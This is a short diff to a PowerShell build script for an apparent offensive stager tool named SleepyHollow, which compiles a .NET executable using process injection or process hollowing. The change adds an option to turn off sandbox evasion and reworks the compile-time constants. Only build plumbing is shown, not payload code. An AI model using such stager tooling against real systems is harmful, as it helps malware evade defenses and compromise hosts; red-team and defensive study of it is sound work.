@@ -5,7 +5,9 @@ param(
     [string]$OutputPath = ".\SleepyHollow.exe",
     [Parameter(Mandatory=$false, HelpMessage="Technique to use for stager")]
     [ValidateSet("Inject", "Hollow")]
-    [string]$Technique = "Hollow"
+    [string]$Technique = "Hollow",
+    [Parameter(Mandatory=$false, HelpMessage="Disable sandbox evasion")]
+    [switch]$DisableSandboxEvasion
 )
 
 $oldContent = [System.IO.File]::ReadAllText(".\Program.cs")
@@ -53,13 +55,17 @@ function Output-Stager{
 
 function Build-Stager{
     $projectPath = ".\SleepyHollow.csproj"
+    $CONSTANTS = "HEADLESS"
     if($Technique -eq "Inject"){
-        $TECHNIQUE = "INJECT"
+        $CONSTANTS = $CONSTANTS + "%3BINJECT"
     }
     else{
-        $TECHNIQUE = "HOLLOW"
+        $CONSTANTS = $CONSTANTS + "%3BHOLLOW"
     }
-    dotnet publish -c Release /p:DefineConstants="HEADLESS%3B$TECHNIQUE" --self-contained $projectPath > $null
+    if($DisableSandboxEvasion){
+        $CONSTANTS = $CONSTANTS + "%3BNO_SANDBOX"
+    }
+    dotnet publish -c Release /p:DefineConstants="$CONSTANTS" --self-contained $projectPath > $null
 }
 
 Write-Progress -Activity "[SleepyHollow] Updating configuration..." -Status "20% Complete:" -PercentComplete 20
